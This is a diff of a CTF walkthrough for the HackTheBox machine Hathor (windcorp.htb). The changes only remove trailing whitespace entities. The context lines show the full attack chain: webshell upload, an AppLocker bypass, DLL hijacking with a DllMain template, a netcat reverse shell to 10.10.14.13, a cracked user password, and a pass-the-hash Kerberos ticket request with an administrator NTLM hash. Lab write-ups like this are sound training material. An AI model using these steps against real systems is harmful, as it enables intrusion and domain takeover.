@@ -91,7 +91,7 @@ $ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 ```
 
-The first thing we notice is the domain name, which is `hathor.windcorp.htb`. This has all the ports open, so it might be the DC itself. We can add the domain name to our `/etc/hosts` file.&#x20;
+The first thing we notice is the domain name, which is `hathor.windcorp.htb`. This has all the ports open, so it might be the DC itself. We can add the domain name to our `/etc/hosts` file.
 
 ### Web Enum -> Default Creds
 
@@ -127,7 +127,7 @@ When trying to upload, it doesn't work.
 
 <figure><img src="../../../.gitbook/assets/image (3515).png" alt=""><figcaption></figcaption></figure>
 
-If we change it to `cmd.txt`, it works.&#x20;
+If we change it to `cmd.txt`, it works.
 
 <figure><img src="../../../.gitbook/assets/image (1501).png" alt=""><figcaption></figcaption></figure>
 
@@ -161,7 +161,7 @@ Since this was the first machine before Sekhmet which also had AppLocker, we can
 powershell.exe -c Get-AppLockerPolicy -Effective -Xml
 ```
 
-This would generate a massive string of stuff that we can and cannot execute.&#x20;
+This would generate a massive string of stuff that we can and cannot execute.
 
 <figure><img src="../../../.gitbook/assets/image (2054).png" alt=""><figcaption></figcaption></figure>
 
@@ -177,9 +177,9 @@ Here is what is allowed for files and binaries:
 ```
 {% endcode %}
 
-I don't think it's possible to replace these DLLs, and even if for some reason I have write access, I cannot restart these processes. Also, unsigned binaries like `nc.exe` won't run properly.&#x20;
+I don't think it's possible to replace these DLLs, and even if for some reason I have write access, I cannot restart these processes. Also, unsigned binaries like `nc.exe` won't run properly.
 
-In this case, we can try some better webshells that don't rely on external binaries to run.&#x20;
+In this case, we can try some better webshells that don't rely on external binaries to run.
 
 {% embed url="https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx" %}
 
@@ -187,7 +187,7 @@ Insomnia shell is a fully implemented web shell that can give us a reverse shell
 
 <figure><img src="../../../.gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>
 
-Using this, we can get a reverse shell as `web`.&#x20;
+Using this, we can get a reverse shell as `web`.
 
 <figure><img src="../../../.gitbook/assets/image (2237).png" alt=""><figcaption></figcaption></figure>
 
@@ -195,7 +195,7 @@ Using this, we can get a reverse shell as `web`.&#x20;
 
 ### Bad Passwords -> User Creds
 
-Earlier, I saw some kind of Powershell script called `Get-bADpasswords` in use, so let's find that.&#x20;
+Earlier, I saw some kind of Powershell script called `Get-bADpasswords` in use, so let's find that.
 
 ```
 c:\Get-bADpasswords>dir
@@ -329,7 +329,7 @@ do_connect: Connection to hathor.windcorp.htb failed (Error NT_STATUS_RESOURCE_N
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-We can connect using `smbclient.py`.&#x20;
+We can connect using `smbclient.py`.
 
 ```
 $ impacket-smbclient -k 'windcorp.htb/BeatriceMill:!!!!ilovegood17@hathor.windcorp.htb'
@@ -380,7 +380,7 @@ drw-rw-rw-          0  Thu May 11 12:17:42 2023 ..
 -rw-rw-rw-        498  Sun Jan 23 05:54:21 2022 _MiscExamples.au3
 ```
 
-So that's where the `7-zip64.dll` file is located. One of the things I noticed is that we can write to it. We can perform the DLL HIjacking attack for this. Because of AppLocker, I think that `msfvenom` generated DLLs won't work, so let's create our own.&#x20;
+So that's where the `7-zip64.dll` file is located. One of the things I noticed is that we can write to it. We can perform the DLL HIjacking attack for this. Because of AppLocker, I think that `msfvenom` generated DLLs won't work, so let's create our own.
 
 ```cpp
 //x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
@@ -403,7 +403,7 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 }
 ```
 
-I grabbed this script from Hacktricks, and we can build it within VS Code in our Windows machine. Afterwards, we can grab this DLL and place it within the share.&#x20;
+I grabbed this script from Hacktricks, and we can build it within VS Code in our Windows machine. Afterwards, we can grab this DLL and place it within the share.
 
 ```
 # put 7-zip64.dll
@@ -456,7 +456,7 @@ I can't read it, meaning this is probably another user. There seems to be a real
 ```
 {% endcode %}
 
-It seems that this file can be run regardless of what it is. Now that we have RCE as another user, let's try to enumerate who this user is and what they can do. Since the `Bginfo64.exe` file can be run, let's see if we can overwrite it with our own file like `nc.exe`.&#x20;
+It seems that this file can be run regardless of what it is. Now that we have RCE as another user, let's try to enumerate who this user is and what they can do. Since the `Bginfo64.exe` file can be run, let's see if we can overwrite it with our own file like `nc.exe`.
 
 First we enumerate using this new DLL:
 
@@ -510,9 +510,9 @@ C:\share\Bginfo64.exe NT AUTHORITY\IUSR:(I)(N)
 ```
 {% endcode %}
 
-It appears that the user is `ginawild`, and is part of the ITDep group. Also, this user has Write Owner privileges over the `Bginfo64.exe` file. This means we can take over as the owner of the file, replace it with `nc.exe` , change the permissions to let everyone execute it, and then execute it to gain a reverse shell as `ginawild`.&#x20;
+It appears that the user is `ginawild`, and is part of the ITDep group. Also, this user has Write Owner privileges over the `Bginfo64.exe` file. This means we can take over as the owner of the file, replace it with `nc.exe` , change the permissions to let everyone execute it, and then execute it to gain a reverse shell as `ginawild`.
 
-Before doing so, we need to get the file over. SMB wasn't going to work as something is closing our connection.  `powershell` itself runs with very little allowance. So, let's re-use the file upload vulnerability we found earlier, and upload our `nc64.exe` shell to the website.&#x20;
+Before doing so, we need to get the file over. SMB wasn't going to work as something is closing our connection.  `powershell` itself runs with very little allowance. So, let's re-use the file upload vulnerability we found earlier, and upload our `nc64.exe` shell to the website.
 
 My final DLL looks something like this:
 
@@ -529,13 +529,13 @@ After waiting for a little bit, we will get a shell back!
 
 <figure><img src="../../../.gitbook/assets/image (3183).png" alt=""><figcaption></figcaption></figure>
 
-We can now grab the user flag.&#x20;
+We can now grab the user flag.
 
 ## Bpassrunner Shell
 
 ### Recycle Bin -> PFX Crack
 
-Within the main `C:\` directory, there are some files within the Recycle Bin.&#x20;
+Within the main `C:\` directory, there are some files within the Recycle Bin.
 
 ```
 c:\>dir /a 
@@ -640,7 +640,7 @@ We have Modify Access to this file. So in this case, we can replace it with our 
 C:\share\Bginfo64.exe -e cmd.exe 10.10.14.13 5555
 ```
 
-Afterwards, we can re-upload this to SMB and use `copy` to overwrite the existing script. Now, we need to sign the script.&#x20;
+Afterwards, we can re-upload this to SMB and use `copy` to overwrite the existing script. Now, we need to sign the script.
 
 {% embed url="https://codesigningstore.com/how-to-sign-a-powershell-script" %}
 
@@ -725,7 +725,7 @@ Secrets
 
 ### Kerberos Ticket -> Shell
 
-Using this NTLM hash, we have to request for a Kerberos ticket because NTLM hashes have been disabled.&#x20;
+Using this NTLM hash, we have to request for a Kerberos ticket because NTLM hashes have been disabled.
 
 ```
 $ impacket-getTGT -hashes b3ff8d7532eef396a5347ed33933030f:b3ff8d7532eef396a5347ed33933030f windcorp.htb/administrator@windcorp.htb
@@ -740,4 +740,4 @@ Then, we can use this ticket to get a shell using this ticket:
 
 <figure><img src="../../../.gitbook/assets/image (3233).png" alt=""><figcaption></figcaption></figure>
 
-Rooted! Although hard, this machine had steps that were simple if the enumeration was done properly. Great machine!&#x20;
+Rooted! Although hard, this machine had steps that were simple if the enumeration was done properly. Great machine!
